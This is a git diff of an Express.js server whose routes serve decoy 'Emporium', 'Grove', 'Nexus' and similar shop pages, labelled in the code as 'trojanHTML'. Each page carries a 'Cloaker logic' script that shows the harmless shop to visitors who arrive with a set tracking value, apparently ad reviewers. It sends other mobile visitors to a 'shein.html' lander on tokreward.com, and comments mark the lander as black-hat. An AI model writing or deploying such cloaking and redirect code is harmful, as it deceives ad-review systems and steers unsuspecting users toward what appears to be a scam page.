@@ -1155,111 +1155,15 @@ app.get('/905/:slug', (req, res, next) => {
             </script>
             <title>${slug}</title>
             <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background-color: #f0f0f0;
-            color: #333;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        header {
-            background-color: #4a90e2;
-            padding: 2em;
-            text-align: right;
-        }
-        h1 {
-            font-size: 2.5em;
-            margin: 0;
-            color: #fff;
-        }
-        .content {
-            flex: 1;
-            padding: 2em;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .shop-info {
-            background-color: #e2e2e2;
-            border-left: 5px solid #4a90e2;
-            padding: 1em;
-            margin-bottom: 2em;
-        }
-        footer {
-            background-color: #333;
-            color: #fff;
-            padding: 1em;
-            text-align: center;
-        }
-        footer a {
-            color: #4a90e2;
-            text-decoration: none;
-        }
-        footer a:hover {
-            text-decoration: underline;
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <h1>${slug} Emporium</h1>
-    </header>
-    
-    <div class="content">
-        <div class="shop-info">
-            <p>Exploring the wonders of: <strong>${slug}</strong></p>
-        </div>
-        
-        <h2>Discover the Extraordinary</h2>
-        <p>Welcome to a realm where imagination meets reality. Our curated collection awaits your discovery.</p>
-        
-        <h3>Why Choose Us?</h3>
-        <ul>
-            <li>Unparalleled selection</li>
-            <li>Expertly crafted experiences</li>
-            <li>Journey into the unknown</li>
-        </ul>
-    </div>
-
-    <footer>
-        <p>Embark on your adventure &copy; 2024 ${slug} Emporium | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
-    </footer>
-</body>
-</html>
-            `;
-            res.send(trojanHTML);
-            console.log(`Served 905 Trojan (${slug})`);
-});
-
-// SHEIN BH FLUENT
-app.get('/9052/:slug', (req, res, next) => {
-    const { slug } = req.params;
-    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
-    const trojanHTML = `
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <script>
-                // Cloaker logic
-                const urlParams = new URLSearchParams(window.location.search);
-                const utmXXX = urlParams.get("xxx");
-                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                if (utmXXX === "__PLACEMENT__") {
-                    } else if (isMobileDevice) {
-                        window.location.href = "${destinationLander}";
-                    } else {
-                    }
-            </script>
-            <title>${slug}</title>
-            <style>
-    body {
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
         font-family: 'Arial', sans-serif;
         background-color: #f9f3e6;
         color: #2c3e50;
-        margin: 0;
+    }
+    .container {
         display: flex;
         flex-direction: column;
         min-height: 100vh;
@@ -1304,36 +1208,274 @@ app.get('/9052/:slug', (req, res, next) => {
 </style>
 </head>
 <body>
-    <header>
-        <h1>${slug} Bazaar</h1>
-    </header>
-    
-    <div class="content">
-        <div class="shop-info">
-            <p>Unveiling the mysteries of: <strong>${slug}</strong></p>
+    <div class="container">
+        <header>
+            <h1>${slug} Bazaar</h1>
+        </header>
+        
+        <div class="content">
+            <div class="shop-info">
+                <p>Unveiling the mysteries of: <strong>${slug}</strong></p>
+            </div>
+            
+            <h2>Embark on a Mystical Journey</h2>
+            <p>Step into a world where the extraordinary becomes tangible. Our collection of wonders awaits your exploration.</p>
+            
+            <h3>The ${slug} Experience</h3>
+            <ul>
+                <li>Artifacts from distant realms</li>
+                <li>Enchanted items for the discerning collector</li>
+                <li>Gateways to unexplored dimensions</li>
+            </ul>
         </div>
         
-        <h2>Embark on a Mystical Journey</h2>
-        <p>Step into a world where the extraordinary becomes tangible. Our collection of wonders awaits your exploration.</p>
-        
-        <h3>The ${slug} Experience</h3>
-        <ul>
-            <li>Artifacts from distant realms</li>
-            <li>Enchanted items for the discerning collector</li>
-            <li>Gateways to unexplored dimensions</li>
-        </ul>
+        <footer>
+            <p>Unlock the secrets of ${slug} &copy; 2024 ${slug} Bazaar | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
     </div>
-    <footer>
-        <p>Unlock the secrets of ${slug} &copy; 2024 ${slug} Bazaar | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
-    </footer>
 </body>
 </html>
-            `;
-            res.send(trojanHTML);
-            console.log(`Served 905 Trojan (${slug})`);
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
 });
 
 // SHEIN BH FLUENT
+app.get('/9051/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Roboto', sans-serif;
+        background-color: #e8f5e9;
+        color: #263238;
+    }
+    .container {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+    header {
+        background-color: #2e7d32;
+        padding: 1.8em;
+        text-align: left;
+    }
+    h1 {
+        font-size: 2.8em;
+        margin: 0;
+        color: #fff;
+        letter-spacing: 2px;
+    }
+    .content {
+        flex: 1;
+        padding: 3em;
+        max-width: 1000px;
+        margin: 0 auto;
+    }
+    .shop-info {
+        background-color: #c8e6c9;
+        border: 2px solid #2e7d32;
+        padding: 1.5em;
+        margin-bottom: 2.5em;
+        border-radius: 15px;
+    }
+    footer {
+        background-color: #1b5e20;
+        color: #fff;
+        padding: 1.2em;
+        text-align: center;
+    }
+    footer a {
+        color: #81c784;
+        text-decoration: none;
+    }
+    footer a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>${slug} Grove</h1>
+        </header>
+        
+        <div class="content">
+            <div class="shop-info">
+                <p>Nurturing the essence of: <strong>${slug}</strong></p>
+            </div>
+            
+            <h2>Cultivate Your Inner Wilderness</h2>
+            <p>Welcome to a sanctuary where nature's wisdom and modern living intertwine. Our carefully tended collection awaits your discovery.</p>
+            
+            <h3>Embrace the ${slug} Spirit</h3>
+            <ul>
+                <li>Eco-friendly innovations</li>
+                <li>Handcrafted botanical wonders</li>
+                <li>Sustainable lifestyle essentials</li>
+            </ul>
+        </div>
+        
+        <footer>
+            <p>Grow with ${slug} &copy; 2024 ${slug} Grove | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9052/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: #ffffff;
+    }
+    .container {
+        display: grid;
+        grid-template-columns: 1fr 2fr;
+        height: 100vh;
+    }
+    .sidebar {
+        background-color: rgba(0, 0, 0, 0.5);
+        padding: 2rem;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+    .main-content {
+        padding: 2rem;
+        overflow-y: auto;
+    }
+    h1 {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+    }
+    .shop-info {
+        background-color: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 1rem;
+        margin-bottom: 2rem;
+    }
+    .feature-list {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1rem;
+    }
+    .feature-item {
+        background-color: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 1rem;
+        transition: transform 0.3s ease;
+    }
+    .feature-item:hover {
+        transform: translateY(-5px);
+    }
+    footer {
+        margin-top: auto;
+    }
+    a {
+        color: #ffd700;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <h1>${slug} Nexus</h1>
+            <div class="shop-info">
+                <p>Bridging realities: <strong>${slug}</strong></p>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Nexus</p>
+                <p><a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </div>
+        <div class="main-content">
+            <h2>Traverse the Boundary</h2>
+            <p>Step into the ${slug} Nexus, where the impossible becomes tangible and the extraordinary becomes your new normal.</p>
+            
+            <h3>Nexus Offerings</h3>
+            <div class="feature-list">
+                <div class="feature-item">
+                    <h4>Reality Shifters</h4>
+                    <p>Tools to bend your perception</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Quantum Relics</h4>
+                    <p>Artifacts from parallel universes</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Temporal Echoes</h4>
+                    <p>Glimpses of past and future</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Consciousness Expanders</h4>
+                    <p>Unlock hidden potentials of your mind</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
 app.get('/9053/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=905`;
@@ -1360,67 +1502,214 @@ app.get('/9053/:slug', (req, res, next) => {
         margin: 0;
         padding: 0;
         height: 100%;
-        font-family: 'Helvetica Neue', Arial, sans-serif;
-        background-color: #f4f4f4;
-        color: #333;
+        font-family: 'Lato', sans-serif;
+        background-color: #1a1a1a;
+        color: #e0e0e0;
     }
     .container {
-        display: flex;
-        flex-direction: column;
+        display: grid;
+        grid-template-columns: repeat(12, 1fr);
+        grid-auto-rows: minmax(100px, auto);
+        gap: 10px;
         height: 100vh;
+        padding: 20px;
+        box-sizing: border-box;
     }
-    header {
-        background-color: #333;
-        color: #fff;
-        padding: 1rem;
+    .item {
+        background-color: #2a2a2a;
+        padding: 20px;
+        border-radius: 5px;
+        transition: all 0.3s ease;
+    }
+    .item:hover {
+        transform: scale(1.02);
+        box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+    }
+    .header {
+        grid-column: 1 / -1;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .title {
+        font-size: 2.5rem;
+        color: #00ffff;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+    }
+    .shop-info {
+        font-style: italic;
+    }
+    .main {
+        grid-column: 1 / span 8;
+        grid-row: 2 / span 2;
+    }
+    .sidebar {
+        grid-column: 9 / -1;
+        grid-row: 2 / span 2;
+    }
+    .feature {
+        grid-column: span 4;
+    }
+    .footer {
+        grid-column: 1 / -1;
         text-align: center;
     }
-    nav {
-        background-color: #444;
-        padding: 0.5rem;
+    h2 {
+        color: #00ffff;
+        border-bottom: 1px solid #00ffff;
+        padding-bottom: 10px;
     }
-    nav ul {
-        list-style-type: none;
-        padding: 0;
-        margin: 0;
-        display: flex;
-        justify-content: center;
-    }
-    nav ul li {
-        margin: 0 1rem;
-    }
-    nav ul li a {
-        color: #fff;
+    a {
+        color: #00ffff;
         text-decoration: none;
     }
-    main {
-        flex: 1;
+    a:hover {
+        text-decoration: underline;
+    }
+    @media (max-width: 768px) {
+        .container {
+            grid-template-columns: 1fr;
+        }
+        .main, .sidebar, .feature {
+            grid-column: 1 / -1;
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <header class="item header">
+            <h1 class="title">${slug} Nexus</h1>
+            <div class="shop-info">Converging realities of <strong>${slug}</strong></div>
+        </header>
+        
+        <main class="item main">
+            <h2>Enter the Nexus</h2>
+            <p>Welcome to the intersection of imagination and reality. Here at ${slug} Nexus, we curate experiences that challenge your perception and expand your horizons.</p>
+        </main>
+        
+        <aside class="item sidebar">
+            <h2>Nexus Updates</h2>
+            <p>Stay tuned for our next reality-bending event. The boundaries of ${slug} are ever-expanding.</p>
+        </aside>
+        
+        <div class="item feature">
+            <h3>Reality Fragments</h3>
+            <p>Collect pieces of alternate worlds</p>
+        </div>
+        
+        <div class="item feature">
+            <h3>Paradox Puzzles</h3>
+            <p>Challenge your mind with impossible riddles</p>
+        </div>
+        
+        <div class="item feature">
+            <h3>Quantum Quests</h3>
+            <p>Embark on journeys across multiple realities</p>
+        </div>
+        
+        <footer class="item footer">
+            <p>Transcend the ordinary with ${slug} &copy; 2024 ${slug} Nexus | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+app.get('/9054/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Playfair Display', serif;
+        background-color: #f0e6d2;
+        color: #3a3a3a;
+    }
+    .scroll {
+        height: 100vh;
+        overflow-y: scroll;
+        scroll-snap-type: y mandatory;
+    }
+    section {
+        height: 100vh;
+        scroll-snap-align: start;
         display: flex;
-        flex-wrap: wrap;
+        flex-direction: column;
         justify-content: center;
         align-items: center;
         padding: 2rem;
+        box-sizing: border-box;
     }
-    .card {
-        background-color: #fff;
-        border-radius: 8px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        margin: 1rem;
+    .hero {
+        background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="50" height="50" fill="%23d4af37"/><rect x="50" y="50" width="50" height="50" fill="%23d4af37"/></svg>');
+        background-size: 20px 20px;
+    }
+    h1 {
+        font-size: 4rem;
+        margin-bottom: 1rem;
+        text-align: center;
+        color: #8b4513;
+    }
+    .shop-info {
+        font-size: 1.5rem;
+        margin-bottom: 2rem;
+        font-style: italic;
+    }
+    .features {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 2rem;
+    }
+    .feature {
+        background-color: #ffffff;
         padding: 1.5rem;
-        width: 300px;
-        transition: transform 0.3s ease;
+        border-radius: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        transition: all 0.3s ease;
+        width: 250px;
     }
-    .card:hover {
-        transform: translateY(-5px);
+    .feature:hover {
+        transform: translateY(-10px);
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+    }
+    .feature h3 {
+        color: #8b4513;
+        margin-top: 0;
     }
     footer {
-        background-color: #333;
-        color: #fff;
-        text-align: center;
+        background-color: #3a3a3a;
+        color: #f0e6d2;
         padding: 1rem;
+        text-align: center;
     }
     a {
-        color: #007bff;
+        color: #d4af37;
         text-decoration: none;
     }
     a:hover {
@@ -1429,45 +1718,47 @@ app.get('/9053/:slug', (req, res, next) => {
 </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>${slug} Hub</h1>
-            <p>Your gateway to ${slug} innovations</p>
-        </header>
+    <div class="scroll">
+        <section class="hero">
+            <h1>${slug} Atelier</h1>
+            <div class="shop-info">Crafting wonders from: <strong>${slug}</strong></div>
+        </section>
         
-        <nav>
-            <ul>
-                <li><a href="#about">About</a></li>
-                <li><a href="#services">Services</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
-        </nav>
+        <section>
+            <h2>Our Masterpieces</h2>
+            <div class="features">
+                <div class="feature">
+                    <h3>Timeless Treasures</h3>
+                    <p>Heirlooms with stories to tell</p>
+                </div>
+                <div class="feature">
+                    <h3>Bespoke Creations</h3>
+                    <p>Tailored to your wildest dreams</p>
+                </div>
+                <div class="feature">
+                    <h3>Artisanal Wonders</h3>
+                    <p>Crafted with passion and precision</p>
+                </div>
+            </div>
+        </section>
         
-        <main>
-            <div class="card">
-                <h2>Discover ${slug}</h2>
-                <p>Explore the cutting-edge advancements in ${slug} technology.</p>
-            </div>
-            <div class="card">
-                <h2>${slug} Solutions</h2>
-                <p>Tailored ${slug} solutions to meet your unique needs.</p>
-            </div>
-            <div class="card">
-                <h2>${slug} Community</h2>
-                <p>Join our thriving community of ${slug} enthusiasts and experts.</p>
-            </div>
-        </main>
+        <section>
+            <h2>Visit Our Atelier</h2>
+            <p>Step into a world where creativity knows no bounds</p>
+            <p>Open by appointment only</p>
+        </section>
         
         <footer>
-            <p>&copy; 2024 ${slug} Hub | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            <p>Discover the art of ${slug} &copy; 2024 ${slug} Atelier | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
         </footer>
     </div>
 </body>
 </html>
-            `;
-            res.send(trojanHTML);
-            console.log(`Served 905 Trojan (${slug})`);
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
 });
+
 
 
 // SHEIN BH FLUENT
@@ -1709,249 +2000,6 @@ app.get('/8762/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
-app.get('/ary/:slug', (req, res, next) => {
-    const { slug } = req.params;
-    const destinationLander = `https://tokreward.com/shein.html?slug=ARY`;
-    const trojanHTML = `
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <script>
-                // Cloaker logic
-                const urlParams = new URLSearchParams(window.location.search);
-                const utmXXX = urlParams.get("xxx");
-                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                if (utmXXX === "__PLACEMENT__") {
-                    } else if (isMobileDevice) {
-                        window.location.href = "${destinationLander}";
-                    } else {
-                    }
-            </script>
-            <title>${slug}</title>
-            <style>
-    body {
-        font-family: 'Roboto', sans-serif;
-        background-color: #e8f5e9;
-        color: #263238;
-        margin: 0;
-        display: flex;
-        flex-direction: column;
-        min-height: 100vh;
-    }
-    header {
-        background-color: #2e7d32;
-        padding: 1.8em;
-        text-align: left;
-    }
-    h1 {
-        font-size: 2.8em;
-        margin: 0;
-        color: #fff;
-        letter-spacing: 2px;
-    }
-    .content {
-        flex: 1;
-        padding: 3em;
-        max-width: 1000px;
-        margin: 0 auto;
-    }
-    .shop-info {
-        background-color: #c8e6c9;
-        border: 2px solid #2e7d32;
-        padding: 1.5em;
-        margin-bottom: 2.5em;
-        border-radius: 15px;
-    }
-    footer {
-        background-color: #1b5e20;
-        color: #fff;
-        padding: 1.2em;
-        text-align: center;
-    }
-    footer a {
-        color: #81c784;
-        text-decoration: none;
-    }
-    footer a:hover {
-        text-decoration: underline;
-    }
-</style>
-</head>
-<body>
-    <header>
-        <h1>${slug} Grove</h1>
-    </header>
-    
-    <div class="content">
-        <div class="shop-info">
-            <p>Nurturing the essence of: <strong>${slug}</strong></p>
-        </div>
-        
-        <h2>Cultivate Your Inner Wilderness</h2>
-        <p>Welcome to a sanctuary where nature's wisdom and modern living intertwine. Our carefully tended collection awaits your discovery.</p>
-        
-        <h3>Embrace the ${slug} Spirit</h3>
-        <ul>
-            <li>Eco-friendly innovations</li>
-            <li>Handcrafted botanical wonders</li>
-            <li>Sustainable lifestyle essentials</li>
-        </ul>
-    </div>
-    <footer>
-        <p>Grow with ${slug} &copy; 2024 ${slug} Grove | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
-    </footer>
-</body>
-</html>
-            `;
-            res.send(trojanHTML);
-            console.log(`Served ARY Trojan (${slug})`);
-});
-
-// SHEIN BH FLUENT
-app.get('/ary2/:slug', (req, res, next) => {
-    const { slug } = req.params;
-    const destinationLander = `https://tokreward.com/shein.html?slug=ARY25+`;
-    const trojanHTML = `
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <script>
-                // Cloaker logic
-                const urlParams = new URLSearchParams(window.location.search);
-                const utmXXX = urlParams.get("xxx");
-                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                if (utmXXX === "__PLACEMENT__") {
-                    } else if (isMobileDevice) {
-                        window.location.href = "${destinationLander}";
-                    } else {
-                    }
-            </script>
-            <title>${slug}</title>
-            <style>
-    body, html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        font-family: 'Roboto', sans-serif;
-        background-color: #121212;
-        color: #e0e0e0;
-    }
-    .parallax-container {
-        height: 100vh;
-        overflow-x: hidden;
-        overflow-y: auto;
-        perspective: 1px;
-    }
-    .parallax-layer {
-        position: absolute;
-        top: 0;
-        right: 0;
-        bottom: 0;
-        left: 0;
-    }
-    .parallax-background {
-        transform: translateZ(-1px) scale(2);
-        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="%23303030"/></svg>') 0 0 repeat;
-        background-size: 50px 50px;
-        height: 100%;
-    }
-    .content {
-        transform: translateZ(0);
-        position: relative;
-        background-color: rgba(18, 18, 18, 0.8);
-        padding: 2rem;
-    }
-    header {
-        text-align: center;
-        padding: 4rem 0;
-    }
-    h1 {
-        font-size: 4rem;
-        color: #bb86fc;
-        margin-bottom: 0.5rem;
-    }
-    .tagline {
-        font-size: 1.5rem;
-        color: #03dac6;
-    }
-    .features {
-        display: flex;
-        justify-content: space-around;
-        flex-wrap: wrap;
-        margin: 4rem 0;
-    }
-    .feature {
-        background-color: #1f1f1f;
-        border-radius: 8px;
-        padding: 2rem;
-        margin: 1rem;
-        width: 300px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    .feature:hover {
-        transform: translateY(-5px);
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
-    }
-    .feature h2 {
-        color: #cf6679;
-        margin-top: 0;
-    }
-    footer {
-        text-align: center;
-        padding: 2rem 0;
-        background-color: #1f1f1f;
-    }
-    a {
-        color: #03dac6;
-        text-decoration: none;
-    }
-    a:hover {
-        text-decoration: underline;
-    }
-</style>
-</head>
-<body>
-    <div class="parallax-container">
-        <div class="parallax-layer parallax-background"></div>
-        <div class="parallax-layer content">
-            <header>
-                <h1>${slug} Odyssey</h1>
-                <p class="tagline">Embark on a journey through ${slug}</p>
-            </header>
-            
-            <div class="features">
-                <div class="feature">
-                    <h2>Explore ${slug}</h2>
-                    <p>Dive into uncharted territories of ${slug} and discover its hidden wonders.</p>
-                </div>
-                <div class="feature">
-                    <h2>${slug} Mastery</h2>
-                    <p>Hone your skills and become a true master of ${slug} techniques.</p>
-                </div>
-                <div class="feature">
-                    <h2>${slug} Fusion</h2>
-                    <p>Experience the synergy of ${slug} with cutting-edge technologies.</p>
-                </div>
-            </div>
-            
-            <footer>
-                <p>&copy; 2024 ${slug} Odyssey | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
-            </footer>
-        </div>
-    </div>
-</body>
-</html>
-            `;
-            res.send(trojanHTML);
-            console.log(`Served ARY Trojan (${slug})`);
-});
-
-// SHEIN BH FLUENT
 app.get('/870/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=870`;
@@ -2106,110 +2154,107 @@ app.get('/947/:slug', (req, res, next) => {
         margin: 0;
         padding: 0;
         height: 100%;
-        font-family: 'Playfair Display', serif;
-        background-color: #f0e6d2;
-        color: #3a3a3a;
+        font-family: 'Oswald', sans-serif;
+        background-color: #f4f4f4;
+        color: #333;
     }
-    .scroll {
-        height: 100vh;
-        overflow-y: scroll;
-        scroll-snap-type: y mandatory;
-    }
-    section {
-        height: 100vh;
-        scroll-snap-align: start;
+    .container {
         display: flex;
         flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        padding: 2rem;
-        box-sizing: border-box;
+        min-height: 100vh;
     }
-    .hero {
-        background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="50" height="50" fill="%23d4af37"/><rect x="50" y="50" width="50" height="50" fill="%23d4af37"/></svg>');
-        background-size: 20px 20px;
-    }
-    h1 {
-        font-size: 4rem;
-        margin-bottom: 1rem;
+    header {
+        background-color: #ff6b6b;
+        color: white;
+        padding: 1em;
         text-align: center;
-        color: #8b4513;
+    }
+    nav {
+        background-color: #4ecdc4;
+        padding: 0.5em;
+    }
+    nav ul {
+        list-style-type: none;
+        padding: 0;
+        margin: 0;
+        display: flex;
+        justify-content: space-around;
+    }
+    nav ul li a {
+        color: white;
+        text-decoration: none;
+        text-transform: uppercase;
+    }
+    .content {
+        flex: 1;
+        padding: 2em;
+        max-width: 800px;
+        margin: 0 auto;
     }
     .shop-info {
-        font-size: 1.5rem;
-        margin-bottom: 2rem;
-        font-style: italic;
+        background-color: #ffeaa7;
+        border-left: 5px solid #fdcb6e;
+        padding: 1em;
+        margin-bottom: 2em;
     }
-    .features {
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: center;
-        gap: 2rem;
+    .feature-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1em;
     }
     .feature {
-        background-color: #ffffff;
-        padding: 1.5rem;
-        border-radius: 10px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        transition: all 0.3s ease;
-        width: 250px;
-    }
-    .feature:hover {
-        transform: translateY(-10px);
-        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-    }
-    .feature h3 {
-        color: #8b4513;
-        margin-top: 0;
+        background-color: white;
+        padding: 1em;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
     }
     footer {
-        background-color: #3a3a3a;
-        color: #f0e6d2;
-        padding: 1rem;
+        background-color: #2d3436;
+        color: white;
         text-align: center;
+        padding: 1em;
     }
-    a {
-        color: #d4af37;
+    footer a {
+        color: #55efc4;
         text-decoration: none;
-    }
-    a:hover {
-        text-decoration: underline;
     }
 </style>
 </head>
 <body>
-    <div class="scroll">
-        <section class="hero">
-            <h1>${slug} Atelier</h1>
-            <div class="shop-info">Crafting wonders from: <strong>${slug}</strong></div>
-        </section>
-        
-        <section>
-            <h2>Our Masterpieces</h2>
-            <div class="features">
+    <div class="container">
+        <header>
+            <h1>${slug} Oasis</h1>
+        </header>
+        <nav>
+            <ul>
+                <li><a href="#about">About</a></li>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+        <div class="content">
+            <div class="shop-info">
+                <p>Discover the wonders of: <strong>${slug}</strong></p>
+            </div>
+            <h2>Welcome to Your Personal Oasis</h2>
+            <p>Immerse yourself in a world where ${slug} comes to life. Our curated experiences await your exploration.</p>
+            <div class="feature-grid">
                 <div class="feature">
-                    <h3>Timeless Treasures</h3>
-                    <p>Heirlooms with stories to tell</p>
+                    <h3>Tranquil Escapes</h3>
+                    <p>Find your inner peace</p>
                 </div>
                 <div class="feature">
-                    <h3>Bespoke Creations</h3>
-                    <p>Tailored to your wildest dreams</p>
+                    <h3>Adventure Awaits</h3>
+                    <p>Embark on thrilling journeys</p>
                 </div>
                 <div class="feature">
-                    <h3>Artisanal Wonders</h3>
-                    <p>Crafted with passion and precision</p>
+                    <h3>Wellness Retreats</h3>
+                    <p>Rejuvenate your body and mind</p>
                 </div>
             </div>
-        </section>
-        
-        <section>
-            <h2>Visit Our Atelier</h2>
-            <p>Step into a world where creativity knows no bounds</p>
-            <p>Open by appointment only</p>
-        </section>
-        
+        </div>
         <footer>
-            <p>Discover the art of ${slug} &copy; 2024 ${slug} Atelier | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            <p>Embrace the ${slug} lifestyle &copy; 2024 ${slug} Oasis | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
         </footer>
     </div>
 </body>
